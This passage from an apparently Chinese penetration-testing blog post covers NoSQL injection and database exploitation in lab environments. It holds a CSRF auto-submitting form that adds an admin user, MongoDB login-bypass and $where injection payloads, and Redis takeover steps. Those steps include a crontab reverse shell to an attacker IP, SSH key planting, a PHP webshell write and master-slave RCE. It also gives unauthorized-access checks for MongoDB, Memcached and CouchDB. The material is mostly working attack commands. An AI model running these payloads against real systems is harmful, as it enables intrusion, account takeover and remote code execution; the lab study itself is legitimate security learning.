+<p>HTTP REST APIs是NoSQL数据库中的一个流行模块，然而，它们引入了一类新的漏洞，它甚至能让攻击者从其他域攻击数据库。在跨域攻击中，攻击者利用合法用户和他们的网页浏览器执行有害的操作。是一种跨站请求伪造（CSRF）攻击形式的违规行为，在此网站信任的用户浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站上，攻击者可以在目标数据库上执行post动作，从而破坏数据库。</p>
+<p>现在让我们看看CSRF攻击是如何使用这个函数增加新文件到管理员集合中的，从而在hr数据库（它被认为处于安全的内部网络中）中增加了一个新的管理员用户，如图5所示。若想攻击成功，必须要满足几个条件。首先，攻击者必须能操作一个网站，要么是他们自己的网站，要么是利用不安全的网站。攻击在该网站放置一个HTML表单以及一段将自动提交该表单的脚本，比如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot; http:&#x2F;&#x2F;safe.internal. db&#x2F;hr&#x2F;admins&#x2F;_insert&quot; method&#x3D;&quot;POST&quot; name&#x3D;&quot;csrf&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;docs&quot; value&#x3D;&quot; [&#123;&quot;username&quot;:attacker&#125;]&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo4rz979kj30wg0l8k5n.jpg" alt="image-20200712133641169"></p>
+<p>藏在防火墙后的内部网络内的用户被欺骗访问一个恶意外部网页，这将导致在内部网络的NoSQL数据库的 REST API 上执行非预期的查询。</p>
+<p>第二，攻击者必须通过网络诱骗或感染用户经常访问的网站欺骗用户进入被感染的网站。最后，用户必须许可访问Mongoose HTTP接口。</p>
+<p>用这种方式，攻击者不必进入内部网络即可执行操作，在本例中，是插入新数据到位于内部网络中的数据库中。这种攻击执行很简单，但要求攻击者要提前侦察去识别主机、数据库名称，等等。</p>
+<h4 id="7、node-js注入-靶场"><a href="#7、node-js注入-靶场" class="headerlink" title="7、node.js注入(靶场)"></a>7、node.js注入(靶场)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">靶场下载地址：https:&#x2F;&#x2F;github.com&#x2F;Charlie-belmer&#x2F;vulnerable-node-app</span><br><span class="line">环境：node.js、Mongodb</span><br><span class="line">进入APP目录下使用命令: node server.js启动环境</span><br><span class="line">PS：若提示错误，使用npm install 下载报错模块</span><br></pre></td></tr></table></figure>
+
+<h5 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h5><p>此页面注入可使用重言式进行绕过登录</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggntfjlv2qj311m0mqgoh.jpg" alt="image-20200712070413889"></p>
+<p>使用burp抓包，如下图</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggm1f0fqb7j30rh0b3gn8.jpg" alt="image-20200710180920921"></h4><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改password</span><br><span class="line">	&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</span><br><span class="line">修改</span><br><span class="line">	&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</span><br><span class="line">都可绕过账户密码登录</span><br></pre></td></tr></table></figure>
+
+<p>注入成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggm1g72jkej30rl09vgn8.jpg" alt="image-20200710181032327"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnu5bax01j31jg0ikwj6.jpg" alt="image-20200712072859566"></p>
+<h5 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a>where注入</h5><p>此页面类似联合查询注入</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnu6wbltbj31n80mitcc.jpg" alt="image-20200712073030844"></p>
+<p>注入恶意代码使得表达式为真来获取所有用户名</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&#39; || &#39;1&#39;&#x3D;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">根据用户输入程序构造如下代码，带入数据库查询后返回所有用户信息</span><br><span class="line">’$where‘:’this.username‘ &#x3D;&#x3D; &#39;&#39; || &#39;1&#39;&#x3D;&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnue2b1smj329t0u0qab.jpg" alt="image-20200712073723584"></p>
+<h3 id="0x03-NoSQL数据库GETSHELL方法"><a href="#0x03-NoSQL数据库GETSHELL方法" class="headerlink" title="0x03 NoSQL数据库GETSHELL方法"></a>0x03 NoSQL数据库GETSHELL方法</h3><p>老生常谈，其实网上有很多关于Redis或Mongodb的漏洞利用方法，不过本文既然是讲NoSQL，Redis和Mongodb算是NoSQL数据库中的代表性数据库，所以本文也总结一下利用方法。</p>
+<h4 id="Redis-getshell方法总结"><a href="#Redis-getshell方法总结" class="headerlink" title="Redis getshell方法总结"></a>Redis getshell方法总结</h4><p>环境搭建</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载：wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.9.tar.gz</span><br><span class="line">解压：tar -zxvf redis-4.0.9.tar.gz</span><br><span class="line">cd redis-4.0.9</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">make install</span><br><span class="line">依次执行</span><br><span class="line"></span><br><span class="line">配置redis.conf</span><br><span class="line">注释 bind 127.0.0.1</span><br><span class="line">关闭保护模式，将protected-mode yes改为no</span><br></pre></td></tr></table></figure>
+
+<p>未授权连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 0.0.0.0 -p 6379 连接上靶机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0hlawcxj315w0pk775.jpg" alt="image-20200712110823533"></p>
+<h5 id="crontab-计划任务"><a href="#crontab-计划任务" class="headerlink" title="crontab-计划任务"></a>crontab-计划任务</h5><p>本机监听</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0ji6dacj30ro07wjrn.jpg" alt="image-20200712111013635"></p>
+<p>redis</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.239.136&#x2F;8888 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0ils1rhj323s0g8gtz.jpg" alt="image-20200712110920900"></p>
+<p>接收到反弹shell</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0u4fj3hj30w40u0tfb.jpg" alt="image-20200712112025614"></p>
+<h5 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h5><p>本地生成秘钥</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd .ssh</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h  192.168.239.129 -x set crackit</span><br></pre></td></tr></table></figure>
+
+<p>redis</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h  192.168.239.129</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config get dir</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">最后本机运行</span><br><span class="line">ssh -i id_rsa root@x.x.x.x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0dm7g43j32740sun4e.jpg" alt="image-20200712110433966"></p>
+<h5 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h  192.168.239.129</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo18p96skj30ue092jsd.jpg" alt="image-20200712113426626"></p>
+<p>写入成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo192t9zxj31m60u079y.jpg" alt="image-20200712113446908"></p>
+<h5 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">so文件：git clone https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;RedisModules-ExecuteCommand(下载后进入目录make，获取恶意so文件)</span><br><span class="line">python脚本：git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;redis-rce.git</span><br><span class="line"></span><br><span class="line">执行命令：python3 redis-rce.py -r 192.168.239.129 -p 6379 -L 192.168.239.136 -f module.so</span><br></pre></td></tr></table></figure>
+
+<p>成功获取shell</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo2c4z28qj31780u07b9.jpg" alt="image-20200712121220182"></p>
+<h4 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h4><p>目标机：ubuntu</p>
+<p>攻击机：kali</p>
+<p>使用docker搭建漏洞环境</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">拉取环境</span><br><span class="line">	sudo docker pull mongo</span><br><span class="line">查看镜像</span><br><span class="line">	sudo docker images</span><br><span class="line">启动容器</span><br><span class="line">	sudo docker run -d -p 27017:27017 --name mongodb mongo</span><br><span class="line">查看mongodb容器IP</span><br><span class="line">	sudo $docker inspect mongodb | grep IPAddress</span><br><span class="line">映射docker mongodb 27917端口到本机27917端口上</span><br><span class="line">	sudo iptables -t nat -A DOCKER -p tcp --dport 27917 -j DNAT --to-destination 172.17.0.2:27017</span><br></pre></td></tr></table></figure>
+
+<p>nmap扫描</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggqxb3t0dfj31100aw75k.jpg" alt="image-20200714233501502"></p>
+<p>至此，漏洞环境搭建成功</p>
+<p>使用metasploit扫描漏洞是否存在</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">扫描模块</span><br><span class="line">	auxiliary&#x2F;scanner&#x2F;mongodb&#x2F;mongodb_login</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggqxx5fpgqj31v00jk451.jpg" alt="image-20200714235614189"></p>
+<p>使用Mongodb连接工具</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载地址：https:&#x2F;&#x2F;nosqlbooster.com&#x2F;downloads</span><br></pre></td></tr></table></figure>
+
+<p>输入靶机IP，连接即可</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyew6oyvj314y0oatcu.jpg" alt="image-20200715001317487"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyee7jevj31bo0u07hm.jpg" alt="image-20200715001247581"></p>
+<p>连接成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyg2p0zgj31e00u0qay.jpg" alt="image-20200715001424500"></p>
+<h4 id="Memcached未授权访问"><a href="#Memcached未授权访问" class="headerlink" title="Memcached未授权访问"></a>Memcached未授权访问</h4><p>目标机:Centos7</p>
+<p>环境搭建</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装：</span><br><span class="line">	sudo yum install memcached</span><br><span class="line">启动服务</span><br><span class="line">	sudo memcached -d -m 128 -p 11211 -u root</span><br><span class="line">查看是否启动服务</span><br><span class="line">	sudo ps -ef | grep memcache</span><br><span class="line">安装客户端</span><br><span class="line">	sudo yum install php-memcached</span><br><span class="line">重启apache服务</span><br><span class="line">	service apache2 restart</span><br><span class="line">查看端口开放</span><br><span class="line">	netstat -an |more</span><br></pre></td></tr></table></figure>
+
+<p>当显示如下图，漏洞环境搭建成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggs2g3lpqbj31420m4tas.jpg" alt="image-20200715231820276"></p>
+<p>漏洞利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.239.137 11211</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggs2i2rhykj31420iamya.jpg" alt="image-20200715232019503"></p>
+<h4 id="CouchDB未授权访问"><a href="#CouchDB未授权访问" class="headerlink" title="CouchDB未授权访问"></a>CouchDB未授权访问</h4><p>目标机：Kali</p>
+<p>环境搭建</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;vulhub&#x2F;vulhub&#x2F;master&#x2F;couchdb&#x2F;CVE-2017-12636&#x2F;docker-compose.yml</span><br><span class="line"></span><br><span class="line">下载环境并启动</span><br><span class="line">	docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>如果访问不了网址,新建docker-compose.yml，将如下代码复制进去即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line">services:</span><br><span class="line">  couchdb:</span><br><span class="line">    image: vulhub&#x2F;couchdb:1.6.0 </span><br><span class="line">    ports:</span><br><span class="line">      - &quot;5984:5984&quot;</span><br></pre></td></tr></table></figure>
+
+<p>环境搭建成功</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggt6qhomutj31qw0dm0u1.jpg" alt="image-20200716223216594"></p>
+<p>漏洞利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.239.129:5984&#x2F;_config				&#x2F;&#x2F;网址后面加上_config，出现如下图说明存在漏洞</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggt6r4c6f3j31if0u07bd.jpg" alt="image-20200716223254136"></p>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本文大概介绍了NoSQL注入的分类，主要讲的是MongoDB数据库注入，背负式和跨域违规，网上资料算是极少，只能从其他文章中摘录放到本文章内。</p>
+<p>不管是SQL注入还是Nosql注入，漏洞产生原因都是未对用户输入的数据进行过滤或过滤不严谨，虽然NoSQL不使用SQL语句，但可根据程序语言来进行注入，不管是PHP，Node.JS或其他语言，没有做好数据过滤照样存在注入，果然世上没有绝对安全的应用，别问，问就是研究的不够深。</p>
+<h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="https://www.jianshu.com/p/25fb182ef52c" target="_blank" rel="noopener">https://www.jianshu.com/p/25fb182ef52c</a></p>
+<p><a href="https://blog.csdn.net/qq_27446553/article/details/79379481?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-79379481.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/79379481?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-79379481.nonecase</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1602092" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1602092</a></p>
+<p><a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/" target="_blank" rel="noopener">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></p>
+<p><a href="https://scotch.io/@401/mongodb-injection-in-nodejs" target="_blank" rel="noopener">https://scotch.io/@401/mongodb-injection-in-nodejs</a></p>
+]]></content>
   </entry>
 </search>
